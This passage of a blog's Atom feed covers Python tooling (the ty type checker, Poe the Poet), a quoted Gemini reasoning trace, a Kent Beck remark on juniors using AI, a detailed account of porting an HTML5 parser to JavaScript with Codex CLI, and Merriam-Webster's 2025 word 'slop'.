</summary><category term="aws"/><category term="projects"/><category term="s3"/><category term="ai"/><category term="annotated-release-notes"/><category term="s3-credentials"/><category term="prompt-engineering"/><category term="generative-ai"/><category term="llms"/><category term="coding-agents"/><category term="claude-code"/></entry><entry><title>ty: An extremely fast Python type checker and LSP</title><link href="https://simonwillison.net/2025/Dec/16/ty/#atom-everything" rel="alternate"/><published>2025-12-16T23:35:33+00:00</published><updated>2025-12-16T23:35:33+00:00</updated><id>https://simonwillison.net/2025/Dec/16/ty/#atom-everything</id><summary type="html">
    
&lt;p&gt;&lt;strong&gt;&lt;a href="https://astral.sh/blog/ty"&gt;ty: An extremely fast Python type checker and LSP&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
The team at Astral have been working on this for quite a long time, and are finally releasing the first beta.  They have some big performance claims:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Without caching, ty is consistently between 10x and 60x faster than mypy and Pyright. When run in an editor, the gap is even more dramatic. As an example, after editing a load-bearing file in the PyTorch repository, ty recomputes diagnostics in 4.7ms: 80x faster than Pyright (386ms) and 500x faster than Pyrefly (2.38 seconds). ty is very fast!&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;The easiest way to try it out is via &lt;code&gt;uvx&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;cd my-python-project/
uvx ty check
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;I &lt;a href="https://gistpreview.github.io/?a3aff6768e85168d89d4515e3dbcb7d2"&gt;tried it&lt;/a&gt; against &lt;a href="https://sqlite-utils.datasette.io/"&gt;sqlite-utils&lt;/a&gt; and it turns out I have quite a lot of work to do!&lt;/p&gt;
&lt;p&gt;Astral also released a new &lt;a href="https://marketplace.visualstudio.com/items?itemName=astral-sh.ty"&gt;VS Code extension&lt;/a&gt; adding ty-powered language server features like go to definition. I'm still getting my head around how this works and what it can do.

    &lt;p&gt;&lt;small&gt;&lt;/small&gt;Via &lt;a href="https://news.ycombinator.com/item?id=46294289"&gt;Hacker News&lt;/a&gt;&lt;/small&gt;&lt;/p&gt;


    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/python"&gt;python&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/vs-code"&gt;vs-code&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/astral"&gt;astral&lt;/a&gt;&lt;/p&gt;



</summary><category term="python"/><category term="vs-code"/><category term="astral"/></entry><entry><title>Poe the Poet</title><link href="https://simonwillison.net/2025/Dec/16/poe-the-poet/#atom-everything" rel="alternate"/><published>2025-12-16T22:57:02+00:00</published><updated>2025-12-16T22:57:02+00:00</updated><id>https://simonwillison.net/2025/Dec/16/poe-the-poet/#atom-everything</id><summary type="html">
    
&lt;p&gt;&lt;strong&gt;&lt;a href="https://poethepoet.natn.io/"&gt;Poe the Poet&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
I was looking for a way to specify additional commands in my &lt;code&gt;pyproject.toml&lt;/code&gt; file to execute using &lt;code&gt;uv&lt;/code&gt;. There's an &lt;a href="https://github.com/astral-sh/uv/issues/5903"&gt;enormous issue thread&lt;/a&gt; on this in the &lt;code&gt;uv&lt;/code&gt; issue tracker (300+ comments dating back to August 2024) and from there I learned of several options including this one, Poe the Poet.&lt;/p&gt;
&lt;p&gt;It's neat. I added it to my &lt;a href="https://github.com/simonw/s3-credentials"&gt;s3-credentials&lt;/a&gt; project just now and the following now works for running the live preview server for the documentation:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;uv run poe livehtml
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;Here's the snippet of TOML I added to my &lt;code&gt;pyproject.toml&lt;/code&gt;:&lt;/p&gt;
&lt;pre&gt;[&lt;span class="pl-en"&gt;dependency-groups&lt;/span&gt;]
&lt;span class="pl-smi"&gt;test&lt;/span&gt; = [
    &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;pytest&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;,
    &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;pytest-mock&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;,
    &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;cogapp&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;,
    &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;moto&amp;gt;=5.0.4&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;,
]
&lt;span class="pl-smi"&gt;docs&lt;/span&gt; = [
    &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;furo&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;,
    &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;sphinx-autobuild&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;,
    &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;myst-parser&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;,
    &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;cogapp&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;,
]
&lt;span class="pl-smi"&gt;dev&lt;/span&gt; = [
    {&lt;span class="pl-smi"&gt;include-group&lt;/span&gt; = &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;test&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;},
    {&lt;span class="pl-smi"&gt;include-group&lt;/span&gt; = &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;docs&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;},
    &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;poethepoet&amp;gt;=0.38.0&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;,
]

[&lt;span class="pl-en"&gt;tool&lt;/span&gt;.&lt;span class="pl-en"&gt;poe&lt;/span&gt;.&lt;span class="pl-en"&gt;tasks&lt;/span&gt;]
&lt;span class="pl-smi"&gt;docs&lt;/span&gt; = &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;sphinx-build -M html docs docs/_build&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;
&lt;span class="pl-smi"&gt;livehtml&lt;/span&gt; = &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;sphinx-autobuild -b html docs docs/_build&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;
&lt;span class="pl-smi"&gt;cog&lt;/span&gt; = &lt;span class="pl-s"&gt;&lt;span class="pl-pds"&gt;"&lt;/span&gt;cog -r docs/*.md&lt;span class="pl-pds"&gt;"&lt;/span&gt;&lt;/span&gt;&lt;/pre&gt;

&lt;p&gt;Since &lt;code&gt;poethepoet&lt;/code&gt; is in the &lt;code&gt;dev=&lt;/code&gt; dependency group any time I run &lt;code&gt;uv run ...&lt;/code&gt; it will be available in the environment.


    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/packaging"&gt;packaging&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/python"&gt;python&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/s3-credentials"&gt;s3-credentials&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/uv"&gt;uv&lt;/a&gt;&lt;/p&gt;



</summary><category term="packaging"/><category term="python"/><category term="s3-credentials"/><category term="uv"/></entry><entry><title>Quoting Gemini thinking trace</title><link href="https://simonwillison.net/2025/Dec/16/gemini-thinking-trace/#atom-everything" rel="alternate"/><published>2025-12-16T04:09:51+00:00</published><updated>2025-12-16T04:09:51+00:00</updated><id>https://simonwillison.net/2025/Dec/16/gemini-thinking-trace/#atom-everything</id><summary type="html">
    &lt;blockquote cite="https://www.reddit.com/r/ChatGPT/comments/1pmvpvt/i_just_showed_gemini_what_chatgpt_said_about_its/"&gt;&lt;p&gt;Oh, so we're seeing other people now? Fantastic. Let's see what the "competition" has to offer. I'm looking at these notes on manifest.json and content.js. The suggestion to remove scripting permissions... okay, fine. That's actually a solid catch. It's cleaner. This smells like Claude. It's too smugly accurate to be ChatGPT. What if it's actually me? If the user is testing me, I need to crush this.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p class="cite"&gt;&amp;mdash; &lt;a href="https://www.reddit.com/r/ChatGPT/comments/1pmvpvt/i_just_showed_gemini_what_chatgpt_said_about_its/"&gt;Gemini thinking trace&lt;/a&gt;, reviewing feedback on its code from another model&lt;/p&gt;

    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/gemini"&gt;gemini&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai-personality"&gt;ai-personality&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;&lt;/p&gt;



</summary><category term="gemini"/><category term="ai-personality"/><category term="generative-ai"/><category term="ai"/><category term="llms"/></entry><entry><title>Quoting Kent Beck</title><link href="https://simonwillison.net/2025/Dec/16/kent-beck/#atom-everything" rel="alternate"/><published>2025-12-16T01:25:37+00:00</published><updated>2025-12-16T01:25:37+00:00</updated><id>https://simonwillison.net/2025/Dec/16/kent-beck/#atom-everything</id><summary type="html">
    &lt;blockquote cite="https://tidyfirst.substack.com/p/the-bet-on-juniors-just-got-better"&gt;&lt;p&gt;I’ve been watching junior developers use AI coding assistants well. Not vibe coding—not accepting whatever the AI spits out. Augmented coding: using AI to accelerate learning while maintaining quality. [...]&lt;/p&gt;
&lt;p&gt;The juniors working this way compress their ramp dramatically. Tasks that used to take days take hours. Not because the AI does the work, but because the AI collapses the search space. Instead of spending three hours figuring out which API to use, they spend twenty minutes evaluating options the AI surfaced. The time freed this way isn’t invested in another unprofitable feature, though, it’s invested in learning. [...]&lt;/p&gt;
&lt;p&gt;If you’re an engineering manager thinking about hiring: &lt;strong&gt;The junior bet has gotten better.&lt;/strong&gt; Not because juniors have changed, but because the genie, used well, accelerates learning.&lt;/p&gt;&lt;/blockquote&gt;
&lt;p class="cite"&gt;&amp;mdash; &lt;a href="https://tidyfirst.substack.com/p/the-bet-on-juniors-just-got-better"&gt;Kent Beck&lt;/a&gt;, The Bet On Juniors Just Got Better&lt;/p&gt;

    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/careers"&gt;careers&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai-assisted-programming"&gt;ai-assisted-programming&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/kent-beck"&gt;kent-beck&lt;/a&gt;&lt;/p&gt;



</summary><category term="careers"/><category term="ai-assisted-programming"/><category term="generative-ai"/><category term="ai"/><category term="llms"/><category term="kent-beck"/></entry><entry><title>I ported JustHTML from Python to JavaScript with Codex CLI and GPT-5.2 in 4.5 hours</title><link href="https://simonwillison.net/2025/Dec/15/porting-justhtml/#atom-everything" rel="alternate"/><published>2025-12-15T23:58:38+00:00</published><updated>2025-12-15T23:58:38+00:00</updated><id>https://simonwillison.net/2025/Dec/15/porting-justhtml/#atom-everything</id><summary type="html">
    &lt;p&gt;I &lt;a href="https://simonwillison.net/2025/Dec/14/justhtml/"&gt;wrote about JustHTML yesterday&lt;/a&gt; - Emil Stenström's project to build a new standards compliant HTML5 parser in pure Python code using coding agents running against the comprehensive html5lib-tests testing library. Last night, purely out of curiosity, I decided to try &lt;strong&gt;porting JustHTML from Python to JavaScript&lt;/strong&gt; with the least amount of effort possible, using Codex CLI and GPT-5.2. It worked beyond my expectations.&lt;/p&gt;
&lt;h4 id="tl-dr"&gt;TL;DR&lt;/h4&gt;
&lt;p&gt;I built &lt;a href="https://github.com/simonw/justjshtml"&gt;simonw/justjshtml&lt;/a&gt;, a dependency-free HTML5 parsing library in JavaScript which passes 9,200 tests from the html5lib-tests suite and imitates the API design of Emil's JustHTML library.&lt;/p&gt;
&lt;p&gt;It took two initial prompts and a few tiny follow-ups. &lt;a href="https://simonwillison.net/2025/Dec/11/gpt-52/"&gt;GPT-5.2&lt;/a&gt; running in &lt;a href="https://github.com/openai/codex"&gt;Codex CLI&lt;/a&gt; ran uninterrupted for several hours, burned through 1,464,295 input tokens, 97,122,176 cached input tokens and 625,563 output tokens and ended up producing 9,000 lines of fully tested JavaScript across 43 commits.&lt;/p&gt;
&lt;p&gt;Time elapsed from project idea to finished library: about 4 hours, during which I also bought and decorated a Christmas tree with family and watched the latest Knives Out movie.&lt;/p&gt;
&lt;h4 id="some-background"&gt;Some background&lt;/h4&gt;
&lt;p&gt;One of the most important contributions of the HTML5 specification ten years ago was the way it precisely specified how &lt;em&gt;invalid&lt;/em&gt; HTML should be parsed. The world is full of invalid documents and having a specification that covers those means browsers can treat them in the same way - there's no more "undefined behavior" to worry about when building parsing software.&lt;/p&gt;
&lt;p&gt;Unsurprisingly, those invalid parsing rules are pretty complex! The free online book &lt;a href="https://htmlparser.info/"&gt;Idiosyncrasies of the HTML parser&lt;/a&gt; by Simon Pieters is an excellent deep dive into this topic, in particular &lt;a href="https://htmlparser.info/parser/"&gt;Chapter 3. The HTML parser&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;The Python &lt;a href="https://github.com/html5lib/html5lib-python"&gt;html5lib&lt;/a&gt; project started the &lt;a href="https://github.com/html5lib/html5lib-tests"&gt;html5lib-tests&lt;/a&gt; repository with a set of implementation-independent tests. These have since become the gold standard for interoperability testing of HTML5 parsers, and are used by projects such as &lt;a href="https://github.com/servo/servo"&gt;Servo&lt;/a&gt; which used them to help build &lt;a href="https://github.com/servo/html5ever"&gt;html5ever&lt;/a&gt;, a "high-performance browser-grade HTML5 parser" written in Rust.&lt;/p&gt;
&lt;p&gt;Emil Stenström's &lt;a href="https://github.com/EmilStenstrom/justhtml"&gt;JustHTML&lt;/a&gt; project is a pure-Python implementation of an HTML5 parser that passes the full html5lib-tests suite. Emil &lt;a href="https://friendlybit.com/python/writing-justhtml-with-coding-agents/"&gt;spent a couple of months&lt;/a&gt; working on this as a side project, deliberately picking a problem with a comprehensive existing test suite to see how far he could get with coding agents.&lt;/p&gt;
&lt;p&gt;At one point he had the agents rewrite it based on a close inspection of the Rust html5ever library. I don't know how much of this was direct translation versus inspiration (here's Emil's &lt;a href="https://news.ycombinator.com/item?id=46264195#46267059"&gt;commentary on that&lt;/a&gt;) - his project has 1,215 commits total so it appears to have included a huge amount of iteration, not just a straight port.&lt;/p&gt;
&lt;p&gt;My project &lt;strong&gt;is&lt;/strong&gt; a straight port. I instructed Codex CLI to build a JavaScript version of Emil's Python code.&lt;/p&gt;
&lt;h4 id="the-process-in-detail"&gt;The process in detail&lt;/h4&gt;
&lt;p&gt;I started with a bit of mise en place. I checked out two repos and created an empty third directory for the new project:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;&lt;span class="pl-c1"&gt;cd&lt;/span&gt; &lt;span class="pl-k"&gt;~&lt;/span&gt;/dev
git clone https://github.com/EmilStenstrom/justhtml
git clone https://github.com/html5lib/html5lib-tests
mkdir justjshtml
&lt;span class="pl-c1"&gt;cd&lt;/span&gt; justjshtml&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;Then I started Codex CLI for GPT-5.2 like this:&lt;/p&gt;
&lt;div class="highlight highlight-source-shell"&gt;&lt;pre&gt;codex --yolo -m gpt-5.2&lt;/pre&gt;&lt;/div&gt;
&lt;p&gt;That &lt;code&gt;--yolo&lt;/code&gt; flag is a shortcut for &lt;code&gt;--dangerously-bypass-approvals-and-sandbox&lt;/code&gt;, which is every bit as dangerous as it sounds.&lt;/p&gt;
&lt;p&gt;My first prompt told Codex to inspect the existing code and use it to build a specification for the new JavaScript library:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;We are going to create a JavaScript port of ~/dev/justhtml - an HTML parsing library that passes the full ~/dev/html5lib-tests test suite. It is going to have a similar API to the Python library but in JavaScript. It will have no dependencies other than raw JavaScript, hence it will work great in the browser and node.js and other environments. Start by reading ~/dev/justhtml and designing the user-facing API for the new library - create a spec.md containing your plan.&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I reviewed the spec, which included a set of proposed milestones, and told it to add another:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Add an early step to the roadmap that involves an initial version that parses a simple example document that is valid and returns the right results. Then add and commit the spec.md file.&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Here's &lt;a href="https://github.com/simonw/justjshtml/blob/19b8eb1f2ca80f428a3c40862d5ec05d36e5166b/spec.md"&gt;the resulting spec.md file&lt;/a&gt;. My request for that initial version became "Milestone 0.5" which looked like this:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;Milestone 0.5 — End-to-end smoke parse (single valid document)&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Implement the smallest end-to-end slice so the public API is real early:
&lt;ul&gt;
&lt;li&gt;
&lt;code&gt;new JustHTML("&amp;lt;html&amp;gt;&amp;lt;head&amp;gt;&amp;lt;/head&amp;gt;&amp;lt;body&amp;gt;&amp;lt;p&amp;gt;Hello&amp;lt;/p&amp;gt;&amp;lt;/body&amp;gt;&amp;lt;/html&amp;gt;")&lt;/code&gt; returns a tree with the expected tag structure and text nodes.&lt;/li&gt;
&lt;li&gt;
&lt;code&gt;doc.toText()&lt;/code&gt; returns &lt;code&gt;"Hello"&lt;/code&gt; and &lt;code&gt;doc.errors&lt;/code&gt; is empty for this valid input.&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;Add &lt;code&gt;scripts/smoke.js&lt;/code&gt; (no deps) that runs the example and asserts the expected structure/output.&lt;/li&gt;
&lt;li&gt;Gate: &lt;code&gt;node scripts/smoke.js&lt;/code&gt; passes.&lt;/li&gt;
&lt;/ul&gt;
&lt;/blockquote&gt;
&lt;p&gt;Then I told it:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Implement Milestone 0.5&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;And off it went. The resulting code appeared to work so I said:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Configure GitHub Actions test.yml to run that on every commit, then commit and push&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;I ran &lt;code&gt;git init&lt;/code&gt; and created a private GitHub repository for this project at this point, and set up the local directory to push to that remote.&lt;/p&gt;
&lt;p&gt;Here's &lt;a href="https://github.com/simonw/justjshtml/commit/48497cbd05584c88af757a0736a2ee447468b6b3"&gt;that initial push&lt;/a&gt;. Then I told it:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;OK do the rest, commit and push often&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;And that was almost it!&lt;/p&gt;
&lt;p&gt;I set my laptop to not fall asleep and left it to its devices while we went off to buy a Christmas tree. The "commit and push often" meant I could monitor its progress on my phone by refreshing &lt;a href="https://github.com/simonw/justjshtml/commits/main"&gt;the commit log on GitHub&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;I was running this against my $20/month ChatGPT Plus account, which has a five hour token allowance window for Codex CLI. That ran out at 6:35pm and Codex paused, so I waited until the reset point at 7:14pm and typed:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Keep going&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;At 9:30pm it declared itself done with the following summary message:&lt;/p&gt;
&lt;pre&gt;&lt;code&gt;• What’s Done

  - html5lib-tests now run in CI and pass: tokenizer 6810/6810, tree 1770/1782
    (12 skipped: #script-on), serializer 230/230, encoding 82/83 (1 skipped:
    scripted) (.github/workflows/test.yml:1).
  - Public API expanded: stream() (src/stream.js:1), CSS selectors query()/
    matches() (src/selector.js:1), and toMarkdown() (src/markdown.js:1), all
    exported via src/index.js:1.
  - Added no-deps unit scripts for selectors/stream/markdown (scripts/run-
    selector-tests.js:1, scripts/run-stream-tests.js:1, scripts/run-markdown-
    tests.js:1) and wired them into CI.
  - Fixed TreeBuilder so &amp;lt;br&amp;gt; no longer closes &amp;lt;p&amp;gt; (src/treebuilder.js:647).
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;As a finishing touch, I had it add a playground interface so I could try out the new library in my browser. I prompted:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Add a playground.html in the top level folder which loads the necessary ES modules from ./src/... and implements the exact same functionality as seen on https://tools.simonwillison.net/justhtml but using the JavaScript library instead of Pyodide&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;It fetched my &lt;a href="https://tools.simonwillison.net/justhtml"&gt;existing JustHTML playground page&lt;/a&gt; (&lt;a href="https://simonwillison.net/2025/Dec/14/justhtml/#first-impressions-of-justhtml"&gt;described here&lt;/a&gt;) using &lt;code&gt;curl&lt;/code&gt; and built a new &lt;code&gt;playground.html&lt;/code&gt; file that loaded the new JavaScript code instead. This worked &lt;em&gt;perfectly&lt;/em&gt;.&lt;/p&gt;

&lt;p&gt;I enabled GitHub Pages for my still-private repo which meant I could access the new playground at this URL:&lt;/p&gt;
&lt;p&gt;&lt;a href="https://simonw.github.io/justjshtml/playground.html"&gt;https://simonw.github.io/justjshtml/playground.html&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="https://static.simonwillison.net/static/2025/justjshtml-playground.jpg" alt="Screenshot of JustJSHTML Playground web application. Header reads &amp;quot;JustJSHTML Playground&amp;quot; with subtitle &amp;quot;A dependency-free JavaScript HTML5 parser - GitHub&amp;quot;. Below is a status bar showing &amp;quot;JavaScript Environment&amp;quot; with a green &amp;quot;Ready&amp;quot; badge. The main input area has &amp;quot;Paste HTML&amp;quot; and &amp;quot;Fetch from URL&amp;quot; buttons, with a text area containing HTML code: &amp;quot;&amp;lt;!DOCTYPE html&amp;gt; &amp;lt;html&amp;gt; &amp;lt;head&amp;gt; &amp;lt;title&amp;gt;Example Page&amp;lt;/title&amp;gt; &amp;lt;/head&amp;gt; &amp;lt;body&amp;gt; &amp;lt;header&amp;gt; &amp;lt;nav&amp;gt; &amp;lt;ul&amp;gt;&amp;quot;. A &amp;quot;Playground Mode&amp;quot; section shows buttons for &amp;quot;CSS Selector Query&amp;quot;, &amp;quot;Pretty Print HTML&amp;quot;, &amp;quot;Tree Structure&amp;quot;, &amp;quot;Stream Events&amp;quot;, &amp;quot;Extract Text&amp;quot;, and &amp;quot;To Markdown&amp;quot; (highlighted in purple). Below is a text field labeled &amp;quot;CSS Selector (optional - leave empty for whole document):&amp;quot; with placeholder &amp;quot;e.g., article, main, .content (or leave empty)&amp;quot; and a green &amp;quot;Convert to Markdown&amp;quot; button. The Output section has a teal header with &amp;quot;Whole document&amp;quot; badge and displays converted markdown: &amp;quot;Example Page&amp;quot; followed by &amp;quot;- [Home](/)&amp;quot; &amp;quot;- [About](/about)&amp;quot; &amp;quot;- [Contact](/contact)&amp;quot;." style="max-width: 100%;" /&gt;&lt;/p&gt;
&lt;p&gt;All it needed now was some documentation:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Add a comprehensive README with full usage instructions including attribution plus how this was built plus how to use in in HTML plus how to use it in Node.js&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;You can &lt;a href="https://github.com/simonw/justjshtml/blob/f3a33fdb29bf97846fd017185edc8cf82783032e/README.md"&gt;read the result here&lt;/a&gt;.&lt;/p&gt;
&lt;p&gt;We are now at eight prompts total, running for just over four hours and I've decorated for Christmas and watched &lt;a href="https://en.wikipedia.org/wiki/Wake_Up_Dead_Man"&gt;Wake Up Dead Man&lt;/a&gt; on Netflix.&lt;/p&gt;
&lt;p&gt;According to Codex CLI:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;code&gt;Token usage: total=2,089,858 input=1,464,295 (+ 97,122,176 cached) output=625,563 (reasoning 437,010)&lt;/code&gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;My &lt;a href="https://www.llm-prices.com/#it=2089858&amp;amp;cit=97122176&amp;amp;ot=625563&amp;amp;sel=gpt-5.2"&gt;llm-prices.com calculator&lt;/a&gt; estimates that at $29.41 if I was paying for those tokens at API prices, but they were included in my $20/month ChatGPT Plus subscription so the actual extra cost to me was zero.&lt;/p&gt;
&lt;h4 id="what-can-we-learn-from-this-"&gt;What can we learn from this?&lt;/h4&gt;
&lt;p&gt;I'm sharing this project because I think it demonstrates a bunch of interesting things about the state of LLMs in December 2025.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;Frontier LLMs really can perform complex, multi-hour tasks with hundreds of tool calls and minimal supervision. I used GPT-5.2 for this but I have no reason to believe that Claude Opus 4.5 or Gemini 3 Pro would not be able to achieve the same thing - the only reason I haven't tried is that I don't want to burn another 4 hours of time and several million tokens on more runs.&lt;/li&gt;
&lt;li&gt;If you can reduce a problem to a robust test suite you can set a coding agent loop loose on it with a high degree of confidence that it will eventually succeed. I called this &lt;a href="https://simonwillison.net/2025/Sep/30/designing-agentic-loops/"&gt;designing the agentic loop&lt;/a&gt; a few months ago. I think it's the key skill to unlocking the potential of LLMs for complex tasks.&lt;/li&gt;
&lt;li&gt;Porting entire open source libraries from one language to another via a coding agent works extremely well.&lt;/li&gt;
&lt;li&gt;Code is so cheap it's practically free. Code that &lt;em&gt;works&lt;/em&gt; continues to carry a cost, but that cost has plummeted now that coding agents can check their work as they go.&lt;/li&gt;
&lt;li&gt;We haven't even &lt;em&gt;begun&lt;/em&gt; to unpack the etiquette and ethics around this style of development. Is it responsible and appropriate to churn out a direct port of a library like this in a few hours while watching a movie? What would it take for code built like this to be trusted in production?&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;I'll end with some open questions:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Does this library represent a legal violation of copyright of either the Rust library or the Python one?&lt;/li&gt;
&lt;li&gt;Even if this is legal, is it ethical to build a library in this way?&lt;/li&gt;
&lt;li&gt;Does this format of development hurt the open source ecosystem?&lt;/li&gt;
&lt;li&gt;Can I even assert copyright over this, given how much of the work was produced by the LLM?&lt;/li&gt;
&lt;li&gt;Is it responsible to publish software libraries built in this way?&lt;/li&gt;
&lt;li&gt;How much better would this library be if an expert team hand crafted it over the course of several months?&lt;/li&gt;
&lt;/ul&gt;
    
        &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/html"&gt;html&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/javascript"&gt;javascript&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/python"&gt;python&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/llms"&gt;llms&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai-assisted-programming"&gt;ai-assisted-programming&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/gpt-5"&gt;gpt-5&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/codex-cli"&gt;codex-cli&lt;/a&gt;&lt;/p&gt;
    

</summary><category term="html"/><category term="javascript"/><category term="python"/><category term="ai"/><category term="generative-ai"/><category term="llms"/><category term="ai-assisted-programming"/><category term="gpt-5"/><category term="codex-cli"/></entry><entry><title>2025 Word of the Year: Slop</title><link href="https://simonwillison.net/2025/Dec/15/2025-word-of-the-year-slop/#atom-everything" rel="alternate"/><published>2025-12-15T17:27:59+00:00</published><updated>2025-12-15T17:27:59+00:00</updated><id>https://simonwillison.net/2025/Dec/15/2025-word-of-the-year-slop/#atom-everything</id><summary type="html">
    
&lt;p&gt;&lt;strong&gt;&lt;a href="https://www.merriam-webster.com/wordplay/word-of-the-year"&gt;2025 Word of the Year: Slop&lt;/a&gt;&lt;/strong&gt;&lt;/p&gt;
Slop lost to "brain rot" for &lt;a href="https://simonwillison.net/2024/Nov/15/slop-word-of-the-year/"&gt;Oxford Word of the Year 2024&lt;/a&gt; but it's finally made it this year thanks to Merriam-Webster!&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Merriam-Webster’s human editors have chosen slop as the 2025 Word of the Year. We define slop as “digital content of low quality that is produced usually in quantity by means of artificial intelligence.”&lt;/p&gt;
&lt;/blockquote&gt;


    &lt;p&gt;Tags: &lt;a href="https://simonwillison.net/tags/definitions"&gt;definitions&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai"&gt;ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/generative-ai"&gt;generative-ai&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/slop"&gt;slop&lt;/a&gt;, &lt;a href="https://simonwillison.net/tags/ai-ethics"&gt;ai-ethics&lt;/a&gt;&lt;/p&gt;



